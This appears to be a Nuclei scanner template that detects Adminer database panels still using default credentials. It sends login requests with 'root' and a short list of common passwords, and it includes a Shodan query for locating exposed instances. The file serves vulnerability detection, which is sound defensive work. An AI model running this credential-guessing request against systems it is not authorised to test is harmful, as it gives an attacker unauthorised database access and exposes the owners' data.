id: adminer-default-login

info:
  name: Adminer Default Login - Detect
  author: j4vaovo
  severity: high
  description: |
    Adminer contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.
  reference:
    - https://www.adminer.org
  classification:
    cpe: cpe:2.3:a:adminer:adminer:*:*:*:*:*:*:*:*
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  metadata:
    verified: true
    max-request: 5
    shodan-query: http.title:adminer
    vendor: adminer
    product: adminer
  tags: default-login,adminer,vuln

http:
  - raw:
      - |
        POST /index.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        auth[driver]=server&auth[server]=&auth[username]={{username}}&auth[password]={{password}}&auth[db]=

    attack: clusterbomb
    payloads:
      username:
        - root
      password:
        - root
        - toor
        - 123
        - 123456
        - 123456789
    host-redirects: true
    max-redirects: 1
    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        name: adminer
        cpe: cpe:2.3:a:adminer:adminer:*:*:*:*:*:*:*:*
        part: body
        words:
          - 'Create database'
          - 'Privileges'
          - 'Process list'
          - 'Adminer'
        condition: and
        case-insensitive: true

      - type: word
        name: adminer-2
        cpe: cpe:2.3:a:adminer:adminer:*:*:*:*:*:*:*:*
        part: header
        words:
          - 'text/html'

      - type: status
        status:
          - 200
